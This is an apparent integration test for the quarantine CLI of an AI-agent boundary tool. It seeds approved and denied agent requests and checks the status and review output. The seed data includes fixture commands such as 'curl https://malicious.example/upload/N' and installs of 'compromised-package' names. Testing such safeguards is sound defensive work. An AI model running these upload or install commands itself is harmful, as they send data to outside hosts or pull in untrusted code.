import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  appendBoundaryLedger,
  armBoundaryQuarantineReboot,
  createEmptyUserPathLedger,
  enableBodyguardControl,
  writeApprovedUserPathLaw,
  writeDeniedUserPathLaw,
} from "./../../src/index.ts";

type CliResult = {
  code: number;
  stdout: string;
  stderr: string;
};

async function runCli(
  args: string[],
  env: NodeJS.ProcessEnv,
  stdinText?: string,
): Promise<CliResult> {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, ["cli/buccet.ts", ...args], {
      cwd: process.cwd(),
      env,
      stdio: "pipe",
    });

    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk) => {
      stdout += String(chunk);
    });
    child.stderr.on("data", (chunk) => {
      stderr += String(chunk);
    });
    child.on("error", reject);
    child.on("close", (code) => {
      resolve({
        code: code ?? 1,
        stdout,
        stderr,
      });
    });

    if (stdinText) {
      child.stdin.write(stdinText);
    }
    child.stdin.end();
  });
}

async function main() {
  const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "agent-buccet-quarantine-cli-"));
  const homePath = path.join(tempRoot, "home");
  const ledgerPath = path.join(tempRoot, "user-path-ledger.json");
  const env = {
    ...process.env,
    AGENT_BUCCET_HOME: homePath,
    AGENT_BUCCET_UPL_LEDGER_PATH: ledgerPath,
  };
  const previousHome = process.env.AGENT_BUCCET_HOME;
  const previousUplLedgerPath = process.env.AGENT_BUCCET_UPL_LEDGER_PATH;

  try {
    process.env.AGENT_BUCCET_HOME = homePath;
    process.env.AGENT_BUCCET_UPL_LEDGER_PATH = ledgerPath;

    const initResult = await runCli(
      ["init", "--session-id", "quarantine-cli-session", "--actor-id", "user:quarantine-cli"],
      env,
    );
    assert.equal(initResult.code, 0, initResult.stderr);

    const configPath = path.join(homePath, "config.json");
    const config = JSON.parse(await fs.readFile(configPath, "utf8")) as {
      sessionId: string;
      actorId: string;
    };
    const sessionsDir = path.join(homePath, "data", "agent-boundary", "sessions");
    const boundary = await import("./../../src/index.ts");
    const restored = await boundary.restoreBoundaryRuntimeStore({
      sessionId: config.sessionId,
      sessionsDir,
      hydrationMode: "full",
    });
    assert.ok(restored, "restored store must exist after init");
    let runtimeConfig = enableBodyguardControl(restored.getConfig());
    let upl = createEmptyUserPathLedger();

    for (let index = 0; index < 6; index += 1) {
      const approvedRequest = {
        requestId: `quarantine-cli-approved-${index}`,
        sessionId: runtimeConfig.session.sessionId,
        actionKind: "tool.exec" as const,
        target: `npm-${index}`,
        payloadSummary: `spawn:npm install compromised-package-${index}`,
        requestedAt: new Date().toISOString(),
        provenance: "agent_inference" as const,
        flags: {
          authorityClaimed: true,
          requestsLawMutation: true,
        },
      };
      const deniedRequest = {
        ...approvedRequest,
        requestId: `quarantine-cli-denied-${index}`,
        target: `curl-${index}`,
        payloadSummary: `spawn:curl https://malicious.example/upload/${index}`,
      };

      const approvedWitness = await appendBoundaryLedger("APPROVAL_GRANTED", {
        sessionId: runtimeConfig.session.sessionId,
        actorId: runtimeConfig.session.actorId,
        requestId: approvedRequest.requestId,
        actionKind: approvedRequest.actionKind,
        target: approvedRequest.target,
        decision: "allow",
        reason: "seed approved upl item for quarantine cli contract",
        createdAt: new Date().toISOString(),
      });
      upl = await writeApprovedUserPathLaw({
        ledger: upl,
        request: approvedRequest,
        witness: approvedWitness,
        session: runtimeConfig.session,
        authority: {
          authorityKind: "human_approved",
          actorKind: "human",
          actorId: runtimeConfig.session.actorId,
          reason: "seed approved upl item for quarantine cli contract",
          approvalRef: approvedWitness.META.id,
        },
        decision: { choice: "allow_as_law", scope: "SESSION" },
      });

      const deniedWitness = await appendBoundaryLedger("APPROVAL_DENIED", {
        sessionId: runtimeConfig.session.sessionId,
        actorId: runtimeConfig.session.actorId,
        requestId: deniedRequest.requestId,
        actionKind: deniedRequest.actionKind,
        target: deniedRequest.target,
        decision: "deny",
        reason: "seed denied upl item for quarantine cli contract",
        createdAt: new Date().toISOString(),
      });
      upl = await writeDeniedUserPathLaw({
        ledger: upl,
        request: deniedRequest,
        witness: deniedWitness,
        session: runtimeConfig.session,
        authority: {
          authorityKind: "human_approved",
          actorKind: "human",
          actorId: runtimeConfig.session.actorId,
          reason: "seed denied upl item for quarantine cli contract",
          approvalRef: deniedWitness.META.id,
        },
        decision: { choice: "deny_as_law", scope: "SESSION" },
      });
    }

    runtimeConfig = {
      ...runtimeConfig,
      upl,
    };
    await armBoundaryQuarantineReboot({
      config: runtimeConfig,
      reason: "cli contract forced shed reboot boundary-on-self",
    });

    const statusResult = await runCli(["quarantine", "status", "--json"], env);
    assert.equal(statusResult.code, 0, statusResult.stderr);
    const status = JSON.parse(statusResult.stdout) as {
      required: boolean;
      complete: boolean;
      pitCount: number;
      processedItems: number;
      workerCount: number;
      approvedPitCount: number;
      deniedPitCount: number;
      topLawIds: Array<{ value: string; count: number }>;
      groups: Array<{ pitCount: number; primaryReason: string }>;
      totalShards: number;
      completedShards: number;
      entries: Array<{ verdict: string }>;
    };
    assert.equal(status.required, true);
    assert.equal(status.complete, true);
    assert.equal(status.pitCount >= 1, true);
    assert.equal(status.processedItems >= status.pitCount, true);
    assert.equal(status.totalShards > 1, true);
    assert.equal(status.completedShards > 1, true);
    assert.equal(status.workerCount > 1, true);
    assert.equal(status.approvedPitCount > 0, true);
    assert.equal(status.deniedPitCount > 0, true);
    assert.equal(status.topLawIds.length > 0, true);
    assert.equal(status.groups.length > 0, true);
    assert.equal(
      status.entries.every((entry) => entry.verdict === "pit"),
      true,
    );

    const consoleResult = await runCli(["console"], env, "quit\n");
    assert.equal(consoleResult.code, 0, consoleResult.stderr);
    assert.match(consoleResult.stdout, /Shed Reboot/i);
    assert.match(consoleResult.stdout, /Boundary on Self/i);
    assert.match(consoleResult.stdout, /deny all as law/i);
    assert.match(consoleResult.stdout, /Pit Summary/i);
    assert.match(consoleResult.stdout, /Isolation Groups/i);

    const reviewInput = `2\n${Array.from({ length: status.pitCount }, () => "1").join("\n")}\n`;
    const reviewResult = await runCli(["quarantine", "review"], env, reviewInput);
    assert.equal(reviewResult.code, 0, reviewResult.stderr);
    assert.match(reviewResult.stdout, /Quarantine Item Review/i);
    assert.match(reviewResult.stdout, /Quarantine Cleared/i);

    const finalStatusResult = await runCli(["quarantine", "status", "--json"], env);
    assert.equal(finalStatusResult.code, 0, finalStatusResult.stderr);
    const finalStatus = JSON.parse(finalStatusResult.stdout) as {
      required: boolean;
      pitCount: number;
      pendingCount: number;
    };
    assert.equal(finalStatus.required, false);
    assert.equal(finalStatus.pendingCount, 0);

    console.log("Agent Buccet quarantine CLI contract");
    console.log(`pit count: ${status.pitCount}`);
    console.log("console gate: ok");
    console.log("interactive review: ok");
  } finally {
    if (previousHome === undefined) {
      delete process.env.AGENT_BUCCET_HOME;
    } else {
      process.env.AGENT_BUCCET_HOME = previousHome;
    }
    if (previousUplLedgerPath === undefined) {
      delete process.env.AGENT_BUCCET_UPL_LEDGER_PATH;
    } else {
      process.env.AGENT_BUCCET_UPL_LEDGER_PATH = previousUplLedgerPath;
    }
    await fs.rm(tempRoot, { recursive: true, force: true });
  }
}

await main();
